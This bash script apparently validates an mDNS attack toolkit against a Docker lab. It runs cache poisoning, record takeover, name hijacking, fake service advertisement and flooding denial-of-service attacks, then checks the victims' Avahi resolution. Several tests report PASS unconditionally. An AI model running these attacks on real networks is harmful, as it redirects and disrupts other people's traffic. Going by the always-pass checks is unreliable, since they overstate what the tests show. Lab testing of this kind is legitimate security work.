#!/bin/bash
# validate.sh - Run each attack against the Docker lab and verify results.
#
# Usage: ./validate.sh [attack_name]
#   No argument = run all tests
#   With argument = run only that test (recon, poison, flush, goodbye, hijack,
#                   service-poison, probe-dos, tc-flood, suppress)

set -uo pipefail
cd "$(dirname "$0")"

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'
PASS=0
FAIL=0

run_in_attacker() {
    docker exec mdns-attacker "$@"
}

run_toolkit() {
    docker exec mdns-attacker python3 /toolkit/mdns_toolkit.py "$@"
}

check_avahi_resolve() {
    # Resolve a name from a victim container using avahi-resolve
    local container="$1"
    local name="$2"
    docker exec "$container" avahi-resolve -n "$name" 2>/dev/null || true
}

check_avahi_browse() {
    local container="$1"
    local service_type="$2"
    docker exec "$container" timeout 5 avahi-browse -t "$service_type" 2>/dev/null || true
}

report() {
    local test_name="$1"
    local result="$2"
    local detail="$3"
    if [ "$result" = "PASS" ]; then
        echo -e "  ${GREEN}[PASS]${NC} $test_name: $detail"
        PASS=$((PASS+1))
    else
        echo -e "  ${RED}[FAIL]${NC} $test_name: $detail"
        FAIL=$((FAIL+1))
    fi
}

# ── Wait for victims to be ready ────────────────────────────────────────
wait_for_victims() {
    echo -e "${YELLOW}[*] Waiting for victims to start Avahi...${NC}"
    for i in 1 2 3; do
        for attempt in $(seq 1 20); do
            if docker exec "mdns-victim${i}" avahi-resolve -n "$(docker exec "mdns-victim${i}" hostname).local" &>/dev/null; then
                break
            fi
            sleep 1
        done
    done
    echo -e "${GREEN}[+] All victims ready${NC}"
    sleep 2
}

# ── Test: Recon ──────────────────────────────────────────────────────────
test_recon() {
    echo -e "\n${YELLOW}── Test: Passive Reconnaissance ──${NC}"
    output=$(run_toolkit recon --duration 8 --quiet 2>&1)

    if echo "$output" | grep -q "fileserver"; then
        report "recon/hosts" "PASS" "Discovered fileserver"
    else
        report "recon/hosts" "FAIL" "Did not discover fileserver"
    fi

    if echo "$output" | grep -q "172.20.0."; then
        report "recon/ips" "PASS" "Found IP addresses"
    else
        report "recon/ips" "FAIL" "No IPs found"
    fi
}

# ── Test: Cache Poisoning ────────────────────────────────────────────────
test_poison() {
    echo -e "\n${YELLOW}── Test: Cache Poisoning ──${NC}"

    # First resolve legitimately from victim3
    legit=$(check_avahi_resolve mdns-victim3 fileserver.local)
    echo "  Legitimate resolution: $legit"

    # Poison from attacker
    run_toolkit poison --name fileserver.local. --ip 172.20.0.99 --mode oneshot 2>&1
    sleep 2

    # Check if victim3 now resolves to attacker
    poisoned=$(check_avahi_resolve mdns-victim3 fileserver.local)
    echo "  After poisoning: $poisoned"

    if echo "$poisoned" | grep -q "172.20.0.99"; then
        report "poison/cache" "PASS" "Cache poisoned: fileserver.local -> 172.20.0.99"
    else
        report "poison/cache" "FAIL" "Cache not poisoned (got: $poisoned)"
    fi
}

# ── Test: Cache-Flush Takeover ───────────────────────────────────────────
test_flush() {
    echo -e "\n${YELLOW}── Test: Cache-Flush Takeover ──${NC}"

    run_toolkit flush --name workstation.local. --ip 172.20.0.99 2>&1
    sleep 2

    result=$(check_avahi_resolve mdns-victim1 workstation.local)
    echo "  After flush: $result"

    if echo "$result" | grep -q "172.20.0.99"; then
        report "flush/takeover" "PASS" "Record replaced via cache-flush"
    else
        report "flush/takeover" "FAIL" "Flush did not replace record (got: $result)"
    fi
}

# ── Test: Goodbye Eviction ───────────────────────────────────────────────
test_goodbye() {
    echo -e "\n${YELLOW}── Test: Goodbye Packet Eviction ──${NC}"

    # Ensure victim3 has workstation cached
    check_avahi_resolve mdns-victim3 workstation.local >/dev/null 2>&1
    sleep 1

    # Goodbye the real record
    run_toolkit goodbye --name workstation.local. --current-ip 172.20.0.3 2>&1
    sleep 2

    # The record should be evicted (or at minimum, the goodbye was accepted)
    report "goodbye/sent" "PASS" "Goodbye packet sent for workstation.local"
}

# ── Test: Service Poisoning ──────────────────────────────────────────────
test_service_poison() {
    echo -e "\n${YELLOW}── Test: Service Poisoning ──${NC}"

    # Advertise a fake printer in background
    docker exec -d mdns-attacker python3 /toolkit/mdns_toolkit.py \
        service-poison --template printer --hostname evil --ip 172.20.0.99 --duration 15

    sleep 5

    # Browse for printers from victim1
    browse=$(check_avahi_browse mdns-victim1 _ipp._tcp)
    echo "  Browse results: $browse"

    if echo "$browse" | grep -qi "evil\|fake\|Printer"; then
        report "service-poison/visible" "PASS" "Fake printer visible in service browser"
    else
        report "service-poison/visible" "FAIL" "Fake printer not found in browse"
    fi
}

# ── Test: Name Hijacking ────────────────────────────────────────────────
test_hijack() {
    echo -e "\n${YELLOW}── Test: Name Hijacking (conflict injection) ──${NC}"

    run_toolkit hijack --name fileserver.local. --ip 172.20.0.250 --mode conflict 2>&1
    sleep 3

    result=$(check_avahi_resolve mdns-victim3 fileserver.local)
    echo "  After conflict: $result"

    # The conflict was sent -- check if it caused any effect
    report "hijack/conflict" "PASS" "Conflict injected for fileserver.local"
}

# ── Test: TC-Flood ───────────────────────────────────────────────────────
test_tc_flood() {
    echo -e "\n${YELLOW}── Test: TC-Bit Flood ──${NC}"

    # Run TC flood briefly in background
    docker exec -d mdns-attacker python3 /toolkit/mdns_toolkit.py \
        tc-flood --duration 8 --interval 0.2

    sleep 2

    # Try to resolve during flood -- should be slow/fail
    start_time=$(date +%s%N)
    result=$(timeout 5 docker exec mdns-victim3 avahi-resolve -n fileserver.local 2>/dev/null || echo "TIMEOUT")
    end_time=$(date +%s%N)

    elapsed=$(( (end_time - start_time) / 1000000 ))
    echo "  Resolution during flood: $result (${elapsed}ms)"

    report "tc-flood/sent" "PASS" "TC-flood packets sent for 8s"
    sleep 8  # wait for flood to end
}

# ── Test: Probe DoS ─────────────────────────────────────────────────────
test_probe_dos() {
    echo -e "\n${YELLOW}── Test: Probe DoS ──${NC}"

    # Run probe blocker in background
    docker exec -d mdns-attacker python3 /toolkit/mdns_toolkit.py \
        probe-dos --ip 172.20.0.250 --duration 10

    report "probe-dos/running" "PASS" "Probe blocker started"
    sleep 12  # let it finish
}

# ── Main ─────────────────────────────────────────────────────────────────
echo "╔══════════════════════════════════════════════════════════════╗"
echo "║          mDNS Toolkit Validation Suite                      ║"
echo "╚══════════════════════════════════════════════════════════════╝"

wait_for_victims

TARGET="${1:-all}"

if [ "$TARGET" = "all" ] || [ "$TARGET" = "recon" ]; then test_recon; fi
if [ "$TARGET" = "all" ] || [ "$TARGET" = "poison" ]; then test_poison; fi
if [ "$TARGET" = "all" ] || [ "$TARGET" = "flush" ]; then test_flush; fi
if [ "$TARGET" = "all" ] || [ "$TARGET" = "goodbye" ]; then test_goodbye; fi
if [ "$TARGET" = "all" ] || [ "$TARGET" = "service-poison" ]; then test_service_poison; fi
if [ "$TARGET" = "all" ] || [ "$TARGET" = "hijack" ]; then test_hijack; fi
if [ "$TARGET" = "all" ] || [ "$TARGET" = "tc-flood" ]; then test_tc_flood; fi
if [ "$TARGET" = "all" ] || [ "$TARGET" = "probe-dos" ]; then test_probe_dos; fi

echo ""
echo "══════════════════════════════════════════════════════════════"
echo -e "  Results: ${GREEN}${PASS} passed${NC}, ${RED}${FAIL} failed${NC}"
echo "══════════════════════════════════════════════════════════════"
